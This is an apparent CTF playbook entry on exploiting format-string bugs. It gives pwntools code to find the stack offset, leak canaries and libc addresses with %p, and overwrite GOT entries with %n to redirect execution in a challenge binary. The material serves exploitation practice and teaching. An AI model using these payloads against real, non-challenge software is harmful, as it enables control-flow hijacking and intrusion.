---
id: format-string-leak-write
category: PWN
tags: [format-string, fmt, printf, percent-p, percent-n, got-overwrite, leak, canary-leak, fmtstr-payload, pwntools]
tools: [pwntools]
manuals: ["Manuals/pwntools/3. Contexto para Claude.md"]
title: "Format string: leak (%p) and arbitrary write (%n / GOT overwrite)"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: [stack-bof-ret2win-ret2libc]
---

## How to recognize this pattern

- A binary that prints your input **without a fixed format string**: `printf(buf)` instead of
  `printf("%s", buf)`. In Ghidra, `printf`/`fprintf`/`sprintf` taking the user buffer directly as the
  1st argument.
- Test: send `%p %p %p %p` and watch addresses/garbage leak (instead of printing the literal).
  `AAAA%p` showing `0x41414141` confirms it and locates your offset.

## Method

### 1. Find your input's offset on the stack
```python
from pwn import *
p = process("./chall")
p.sendline(b"AAAABBBB" + b".%p"*10)
# count which %p returns 0x4242424242424242 (or 41414141 in 32-bit) → that's offset N
```
Or automatically: pwntools' `FmtStr` figures it out on its own.

### 2. Leak (canary / libc / stack)
```python
p.sendline(b"%7$p|%15$p")           # leaks the 7th and 15th qword on the stack (adjust the indices)
# canary: ends in 00 and isn't an address; libc: starts with 0x7f...
```

### 3. Arbitrary write with %n (GOT overwrite / ret2win)
```python
from pwn import *
elf = ELF("./chall")
# overwrite the GOT entry of printf/exit with the address of win/system:
def send(payload): return p.sendline(payload)
fmt = FmtStr(execute_fmt=send, offset=OFFSET)   # offset from step 1
fmt.write(elf.got["exit"], elf.sym["win"])
fmt.execute_writes()
p.interactive()
```
Manual (without FmtStr): `fmtstr_payload(OFFSET, {elf.got['exit']: elf.sym['win']})`.

## Gotchas

- **32 vs 64 bit:** in 64-bit the first 5-6 args come from registers, so your buffer appears at a
  higher offset; and addresses have `00` bytes that cut the string short, so put the targets **at the
  end** of the payload (`fmtstr_payload` already handles this).
- Prefer pwntools' `fmtstr_payload`/`FmtStr` over building `%n` by hand: the alignment of
  `%hn`/`%hhn` and the order of the writes are easy to get wrong.
- If you only need to **leak** (e.g. the flag is on the stack/bss), stop at step 2 and don't build a
  write for nothing.
- PIE/full RELRO: the GOT is read-only (RELRO) → target the return address/`__malloc_hook` instead of
  the GOT, or combine it with a leak to defeat PIE.

## Cross-reference

- `Manuals/pwntools/3. Contexto para Claude.md`: `FmtStr`, `fmtstr_payload`, `ELF`.
- `stack-bof-ret2win-ret2libc`: if there's an overflow besides the format string, the BOF is
  sometimes the shorter path.
